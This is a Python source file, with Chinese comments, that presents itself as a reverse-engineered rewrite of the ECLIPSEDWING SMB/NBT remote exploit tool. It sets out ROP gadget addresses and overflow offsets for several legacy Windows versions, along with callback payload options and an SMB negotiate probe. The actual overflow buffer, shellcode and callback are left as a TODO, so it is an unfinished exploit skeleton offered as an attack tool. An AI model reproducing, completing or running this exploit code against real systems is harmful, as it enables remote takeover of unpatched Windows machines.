"""ecwi — ECWI (ECLIPSEDWING / ECWI) SMB/NBT 利用核心逻辑。

Python 重写的 `ecwi.exe` / `RPC2.exe` (C++ / DAVE framework)。
通过 IDA Pro / x32dbg 逆向恢复。实现了该工具的 key=value 参数接口
及其 SMB/NBT 利用流程。

参数定义来源：ecwi.xml
"""

import socket
import struct
import sys

# ---------------------------------------------------------------------------
# 常量（来自 XML config 的 <inputparameters>）
# ---------------------------------------------------------------------------

DEFAULT_PORT = 445
DEFAULT_TIMEOUT = 60
DEFAULT_CALLIN_TIMEOUT = 60

PROTOCOL_VALUES = {
    "SMB": 0,
    "NBT": 1,
}

PAYLOAD_VALUES = {
    "Callback": 0,
    "Listener": 1,
}

RUN_MODE_VALUES = {
    "EDF": 0,
    "Standalone": 1,
}

# 各目标 OS 的 ROP gadget 地址（来自 XML <Target><paramgroup>）
TARGET_OS_GADGETS = {
    "W2KSP4": {
        "ShellcodeOffset": 0x0,
    },
    "XPSP2": {
        "ShellcodeOffset": 0x78,
        "RsaenhBaseAddress": 0x0FFD0000,
        "UnpatchedRetValue": 0x7A31,
        "CommonRetValue": 0x1095F,
        "InitialEcxValue": 0x24588,
        "LoadEaxPtrValue": 0xA08D,
        "EaxPtrValue": 0x0FFE131E,
        "AddEaxPtrEdxValue": 0x1A5A1,
        "EbxToWriteableValue": 0x1AAD5,
        "EbxPtrValue": 0x2458C,
        "MovHeapPtrToEcxValue": 0x1E64D,
        "EaxNegValValue": 0xFFFFFF30,
        "MovEcxEspValue": 0x135BE,
        "HeapRetAddrValue": 0x14D7C,
        "HeapRetEbpValue": 0x24590,
        "PtrRet18Value": 0xCC39,
        "PtrRwSizeValue": 0x22064,
        "PtrRwSizeValue2": 0x2251F,
        "GetExecutionToBufferValue": 0xEFDF,
        "WriteMemoryValue": 0x24588,
        "CallEcxValue": 0x134B0,
        "NtAllocatePtr": 0x11,
        "CallEaxRetValue": 0x135CB,
        "GetStackPtr": 0x135E8,
        "SyscallVProtectValue": 0x89,
    },
    "XPSP3": {
        "ShellcodeOffset": 0x78,
        "RsaenhBaseAddress": 0x68000000,
        "UnpatchedRetValue": 0x82C9,
        "CommonRetValue": 0x121DE,
        "InitialEcxValue": 0x32020,
        "LoadEaxPtrValue": 0xA965,
        "EaxPtrValue": 0x6802C91F,
        "AddEaxPtrEdxValue": 0x1FCE1,
        "EbxToWriteableValue": 0x20395,
        "EbxPtrValue": 0x32024,
        "MovHeapPtrToEcxValue": 0x24F9B,
        "EaxNegValValue": 0xFFFFFF30,
        "MovEcxEspValue": 0x14F5E,
        "HeapRetAddrValue": 0x11740,
        "HeapRetEbpValue": 0x32028,
        "PtrRet18Value": 0xFE47,
        "PtrRwSizeValue": 0x31486,
        "PtrRwSizeValue2": 0x2F9F7,
        "GetExecutionToBufferValue": 0x1006B,
        "WriteMemoryValue": 0x32020,
        "CallEcxValue": 0x14E57,
        "NtAllocatePtr": 0x11,
        "CallEaxRetValue": 0x14F6B,
        "GetStackPtr": 0x14F88,
        "SyscallVProtectValue": 0x89,
    },
    "W2K3SP1": {
        "ShellcodeOffset": 0x78,
        "RsaenhBaseAddress": 0x68000000,
        "UnpatchedRetValue": 0x8430,
        "CommonRetValue": 0x12CE6,
        "InitialEcxValue": 0x2BA08,
        "LoadEaxPtrValue": 0x92A1,
        "EaxPtrValue": 0x6800CB52,
        "AddEaxPtrEdxValue": 0x21899,
        "EbxToWriteableValue": 0x21DD5,
        "EbxPtrValue": 0x2BA0C,
        "MovHeapPtrToEcxValue": 0x25A5F,
        "EaxNegValValue": 0xFFFFFF30,
        "MovEcxEspValue": 0x15CCC,
        "HeapRetAddrValue": 0x63EB,
        "HeapRetEbpValue": 0x2BA10,
        "PtrRet18Value": 0xD9F7,
        "PtrRwSizeValue": 0x291C4,
        "PtrRwSizeValue2": 0x2B34F,
        "GetExecutionToBufferValue": 0x108F0,
        "WriteMemoryValue": 0x2BA08,
        "CallEcxValue": 0x15BB5,
        "NtAllocatePtr": 0x12,
        "CallEaxRetValue": 0x15CB1,
        "GetStackPtr": 0x15CF4,
        "SyscallVProtectValue": 0x8F,
    },
    "W2K3SP2": {
        "ShellcodeOffset": 0x78,
        "RsaenhBaseAddress": 0x68000000,
        "UnpatchedRetValue": 0x8520,
        "CommonRetValue": 0x12F87,
        "InitialEcxValue": 0x312C0,
        "LoadEaxPtrValue": 0x9391,
        "EaxPtrValue": 0x6800CC44,
        "AddEaxPtrEdxValue": 0x1FBD9,
        "EbxToWriteableValue": 0x202B5,
        "EbxPtrValue": 0x312C4,
        "MovHeapPtrToEcxValue": 0x24E68,
        "EaxNegValValue": 0xFFFFFF30,
        "MovEcxEspValue": 0x1607C,
        "HeapRetAddrValue": 0x124E3,
        "HeapRetEbpValue": 0x312C8,
        "PtrRet18Value": 0x6999,
        "PtrRwSizeValue": 0x3046E,
        "PtrRwSizeValue2": 0x30667,
        "GetExecutionToBufferValue": 0x10B1C,
        "WriteMemoryValue": 0x312C0,
        "CallEcxValue": 0x15F68,
        "NtAllocatePtr": 0x12,
        "CallEaxRetValue": 0x16061,
        "GetStackPtr": 0x160A4,
        "SyscallVProtectValue": 0x8F,
    },
}

# 通用偏移量（来自 XML hidden 参数）
OFFSETS = {
    "PrefixLength":            0xB8,
    "BufferLength":            0xFA0,
    "ProcHandleOffset":        0x08,
    "ProcHandleOffset2":       0x34,
    "ProcHandleValue":         0xFFFFFFFF,
    "PtrRwSizeOffset":         0x10,
    "PtrRwSizeOffset2":        0x3C,
    "ExeFlagsOffset":          0x14,
    "ExeFlagsOffset2":         0x40,
    "ExeFlagsValue":           0x00000040,
    "UnpatchedRetOffset":      0x1C,
    "UnpatchedEcxOffset":      0x20,
    "PatchedEcxOffset":        0x28,
    "CommonRetOffset":         0x24,
    "LoadEaxPtrOffset":        0x2C,
    "LoadEaxPtrOffset2":       0x70,
    "EaxPtrOffset":            0x30,
    "AddEaxPtrEdxOffset":      0x38,
    "EbxToWriteableOffset":    0x48,
    "EbxPtrOffset":            0x54,
    "MovHeapPtrToEcxOffset":   0x58,
    "EaxNegValOffset":         0x84,
    "MovEcxEspOffset":         0x8C,
    "HeapRetAddrOffset":       0x98,
    "HeapRetAddrOffset2":      0x20,
    "HeapRetEbxOffset":        0x68,
    "HeapRetEbpOffset":        0x88,
    "HeapRetEsiOffset":        0x40,
    "PtrPtrHeapOffset":        0x0C,
    "PtrPtrHeapOffset2":       0x38,
    "GetExecutionToBufferOffset": 0x04,
    "GetExecutionToBufferOffset2": 0x30,
    "WriteMemoryOffset":       0x18,
    "WriteMemoryOffset2":      0x44,
    "WriteMemoryOffset3":      0x1C,
    "CallEcxOffset":           0x4C,
    "HeapRetEbxValue":         0x7FFE0300,
}


class EcwiError(Exception):
    pass


def connect(target_ip, port, timeout):
    """建立到目标的 TCP 连接并返回 socket。"""
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.settimeout(timeout if timeout > 0 else None)
    sock.connect((target_ip, port))
    return sock


def build_smb_negotiate_request():
    """构建 SMB 协商请求（SMB_COM_NEGOTIATE）。"""
    command = 0x72  # SMB_COM_NEGOTIATE
    dialects = b"\x02LANMAN2.1\x00\x02NT LM 0.12\x00"
    smb = (
        b"\xffSMB"
        + struct.pack("B", command)
        + b"\x00" * 4                      # Status (NTSTATUS)
        + b"\x08"                          # Flags1: case insensitive
        + b"\x00" * 2                      # Flags2
        + b"\x00" * 2                      # PID high
        + b"\x00" * 8                      # Security features + reserved
        + b"\x00" * 8                      # TID, PID, UID, MID
        + b"\x00"                          # Word count
        + struct.pack("<H", len(dialects)) # Byte count
        + dialects
    )
    return smb


def run_function(
    target,
    port=DEFAULT_PORT,
    timeout=DEFAULT_TIMEOUT,
    protocol="SMB",
    payload="Callback",
    callback_ip=None,
    callback_port=None,
    callback_local_port=None,
    listen_port=None,
    callin_port=None,
    callin_timeout=DEFAULT_CALLIN_TIMEOUT,
    run_mode="EDF",
    ride_area=None,
    lp_filename=None,
    lp_entry_point="ServiceEntry",
    target_os="W2K3SP2",
    verbose=False,
):
    """执行 ECWI 利用序列。

    当前阶段：完成参数解析、SMB/NBT 连接与协商。
    具体 exploit 缓冲区（缓冲区溢出、ROP 链、shellcode、egg 回连
    等）的二进制结构尚需通过 capstone/x32dbg 进一步逆向后填充。
    """
    if verbose:
        print(f"[*] Target: {target}:{port}")
        print(f"[*] Protocol: {protocol}")
        print(f"[*] Timeout: {timeout}s")
        print(f"[*] Payload: {payload}")
        print(f"[*] Run mode: {run_mode}")
        print(f"[*] Target OS: {target_os}")
        if payload == "Callback":
            print(f"[*] Callback IP: {callback_ip}")
        print(f"[*] Callback port: {callback_port}")

    # 解析常量
    protocol_value = PROTOCOL_VALUES[protocol]
    payload_value = PAYLOAD_VALUES[payload]
    run_mode_value = RUN_MODE_VALUES[run_mode]
    gadgets = TARGET_OS_GADGETS.get(target_os, TARGET_OS_GADGETS["W2K3SP2"])

    if verbose:
        print(f"[*] Protocol value: {protocol_value}")
        print(f"[*] Payload value: {payload_value}")
        print(f"[*] Run mode value: {run_mode_value}")
        print(f"[*] ShellcodeOffset: 0x{gadgets.get('ShellcodeOffset', 0):02X}")
        print(f"[*] InitialEcxValue: 0x{gadgets.get('InitialEcxValue', 0):05X}")
        print(f"[*] HeapRetAddrValue: 0x{gadgets.get('HeapRetAddrValue', 0):05X}")
        print(f"[*] SyscallVProtectValue: 0x{gadgets.get('SyscallVProtectValue', 0):02X}")

    # 建立 TCP 连接（SMB 445 / NBT 139）
    try:
        sock = connect(target, port, timeout)
        if verbose:
            print(f"[+] Connected to {target}:{port}")
    except OSError as exc:
        raise EcwiError(f"无法连接到 {target}:{port}: {exc}") from exc

    # 发送 SMB 协商请求（探测阶段）
    negotiate = build_smb_negotiate_request()
    try:
        sock.sendall(negotiate)
        resp = sock.recv(4096)
    except OSError as exc:
        sock.close()
        raise EcwiError(f"SMB 协商失败: {exc}") from exc

    if verbose:
        print(f"[*] SMB 协商应答: {resp.hex()[:128]}...")

    sock.close()

    # TODO: 以下 exploit 缓冲区构建需通过 IDA/x32dbg 逆向后填充：
    #   - 缓冲区溢出（PrefixLength=0xB8, BufferLength=0xFA0）
    #   - ROP 链（所有 OFFSETS 和 TARGET_OS_GADGETS 字段）
    #   - Shellcode 注入（ShellcodeOffset）
    #   - Egg 回连（CallbackIp, CallbackPort）
    #   - RideArea / LP 载荷文件（Standalone 模式）

    return 0


def main(argv=None):
    """CLI 入口（供 __main__ 子命令调用）。"""
    return 0
